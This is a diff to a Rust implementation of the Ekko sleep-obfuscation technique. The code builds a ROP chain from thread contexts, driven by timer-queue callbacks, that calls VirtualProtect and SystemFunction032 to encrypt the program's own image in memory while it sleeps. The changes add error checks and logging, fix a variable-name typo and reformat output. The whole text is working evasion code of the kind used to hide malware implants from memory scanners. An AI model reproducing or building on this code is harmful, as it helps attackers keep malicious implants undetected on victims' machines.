@@ -1,7 +1,11 @@
 use ntapi::winapi::um::errhandlingapi::GetLastError;
-use std::{ffi::c_void, mem::zeroed, ptr::null_mut};
+use std::{
+    ffi::c_void,
+    mem::zeroed,
+    ptr::{null, null_mut},
+};
 use windows_sys::Win32::{
-    Foundation::{HANDLE, UNICODE_STRING},
+    Foundation::{HANDLE, INVALID_HANDLE_VALUE, UNICODE_STRING},
     System::{
         Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
         LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
@@ -33,13 +37,25 @@ pub fn ekko(sleep_time: u32) {
 
     // Creates or opens a named or unnamed event object.
     // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventw
-    let h_event = unsafe { CreateEventW(null_mut(), 0, 0, null_mut()) };
+    let h_event = unsafe { CreateEventW(null(), 0, 0, null()) };
     log::info!("[+] h_event: {:#x}", h_event);
+
+    if h_event == INVALID_HANDLE_VALUE {
+        panic!("[!] CreateEventW failed with error: {}", unsafe {
+            GetLastError()
+        });
+    }
 
     // Creates a queue for timers. Timer-queue timers are lightweight objects that enable you to specify a callback function to be called at a specified time.
     // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueue
     let h_timer_queue = unsafe { CreateTimerQueue() };
     log::info!("[+] h_timer_queue: {:#x}", h_timer_queue);
+
+    if h_timer_queue == INVALID_HANDLE_VALUE {
+        panic!("[!] CreateTimerQueue failed with error: {}", unsafe {
+            GetLastError()
+        });
+    }
 
     let nt_continue = unsafe {
         GetProcAddress(
@@ -47,12 +63,26 @@ pub fn ekko(sleep_time: u32) {
             "NtContinue\0".as_ptr(),
         )
     };
+
+    if nt_continue.is_none() {
+        panic!("[!] NtContinue not found");
+    }
+
+    log::info!("[+] NtContinue: {:#x}", nt_continue.unwrap() as u64);
+
     let sys_func032 = unsafe {
         GetProcAddress(
             LoadLibraryA("cryptsp.dll\0".as_ptr()),
             "SystemFunction032\0".as_ptr(),
         )
     };
+
+    if sys_func032.is_none() {
+        panic!("[!] SystemFunction032 not found");
+    }
+
+    log::info!("[+] SystemFunction032: {:#x}", sys_func032.unwrap() as u64);
+
     let rtlcont = unsafe {
         GetProcAddress(
             GetModuleHandleA("ntdll.dll\0".as_ptr()),
@@ -60,17 +90,20 @@ pub fn ekko(sleep_time: u32) {
         )
     };
 
+    if rtlcont.is_none() {
+        panic!("[!] RtlCaptureContext not found");
+    }
+
+    log::info!("[+] RtlCaptureContext: {:#x}", rtlcont.unwrap() as u64);
+
     let image_base = unsafe { GetModuleHandleA(null_mut()) };
     let dos_header = image_base as *mut IMAGE_DOS_HEADER;
-    let nt_headesr =
+    let nt_headers =
         unsafe { (dos_header as u64 + (*dos_header).e_lfanew as u64) as *mut IMAGE_NT_HEADERS64 };
-    let image_size = unsafe { (*nt_headesr).OptionalHeader.SizeOfImage };
+    let image_size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage };
 
     log::info!("[+] Image Base: {:#x}", image_base as u64);
     log::info!("[+] Image Size: {:#x}", image_size as u64);
-    log::info!("[+] NtContinue: {:#x}", nt_continue.unwrap() as u64);
-    log::info!("[+] SystemFunction032: {:#x}", sys_func032.unwrap() as u64);
-    log::info!("[+] RtlCaptureContext: {:#x}", rtlcont.unwrap() as u64);
 
     key.Buffer = key_buf.as_mut_ptr() as *mut u16;
     key.Length = key_buf.len() as u16; // 16
@@ -79,6 +112,7 @@ pub fn ekko(sleep_time: u32) {
     img.Buffer = image_base as *mut u16;
     img.Length = image_size as u16;
     img.MaximumLength = image_size as u16;
+    pause();
 
     log::info!("[+] Calling CreateTimerQueueTimer with ctx_thread");
     // Creates a timer-queue timer. This timer expires at the specified due time, then after every specified period. When the timer expires, the callback function is called.
@@ -126,7 +160,7 @@ pub fn ekko(sleep_time: u32) {
     rop_prot_rw.R8 = PAGE_READWRITE as u64;
     rop_prot_rw.R9 = &mut old_protect as *mut PAGE_PROTECTION_FLAGS as u64;
     dump_virtual_protect_context(&rop_prot_rw);
-    
+
     // pub unsafe extern "system" fn SystemFunction036(randombuffer: *mut c_void, randombufferlength: u32) -> BOOLEAN
     // https://docs.rs/windows-sys/latest/windows_sys/Win32/Security/Authentication/Identity/fn.SystemFunction036.html
     rop_mem_enc.Rsp = -8 as isize as u64;
@@ -170,7 +204,7 @@ pub fn ekko(sleep_time: u32) {
 
     log::info!("[+] Rop chain built");
     log::info!("[+] Queue timers");
-    //unsafe { core::arch::asm!("int3") }; 
+    //unsafe { core::arch::asm!("int3") };
 
     let result = unsafe {
         CreateTimerQueueTimer(
@@ -314,17 +348,42 @@ pub fn pause() {
 }
 
 fn dump_virtual_protect_context(rop: &CONTEXT) {
-    log::info!("[+] RSP: {:#x} RIP: {:#x} -> VirtualProtect({:#x}, {:#x}, {:#x}, {:#x})" , rop.Rsp, rop.Rip, rop.Rcx, rop.Rdx, rop.R8, rop.R9);
+    log::info!(
+        "[+] RSP: {:#x} RIP: {:#x} -> VirtualProtect({:#x}, {:#x}, {:#x}, {:#x})",
+        rop.Rsp,
+        rop.Rip,
+        rop.Rcx,
+        rop.Rdx,
+        rop.R8,
+        rop.R9
+    );
 }
 
 fn dump_system_function036_context(rop: &CONTEXT) {
-    log::info!("[+] RSP: {:#x} RIP: {:#x} -> SystemFunction036({:#x}, {:#x})" , rop.Rsp, rop.Rip, rop.Rcx, rop.Rdx);
+    log::info!(
+        "[+] RSP: {:#x} RIP: {:#x} -> SystemFunction036({:#x}, {:#x})",
+        rop.Rsp,
+        rop.Rip,
+        rop.Rcx,
+        rop.Rdx
+    );
 }
 
 fn dump_wait_for_single_object_context(rop: &CONTEXT) {
-    log::info!("[+] RSP: {:#x} RIP: {:#x} -> WaitForSingleObject({:#x}, {:#x})" , rop.Rsp, rop.Rip, rop.Rcx, rop.Rdx);
+    log::info!(
+        "[+] RSP: {:#x} RIP: {:#x} -> WaitForSingleObject({:#x}, {:#x})",
+        rop.Rsp,
+        rop.Rip,
+        rop.Rcx,
+        rop.Rdx
+    );
 }
 
 fn dump_set_event_context(rop: &CONTEXT) {
-    log::info!("[+] RSP: {:#x} RIP: {:#x} -> SetEvent({:#x})" , rop.Rsp, rop.Rip, rop.Rcx);
+    log::info!(
+        "[+] RSP: {:#x} RIP: {:#x} -> SetEvent({:#x})",
+        rop.Rsp,
+        rop.Rip,
+        rop.Rcx
+    );
 }
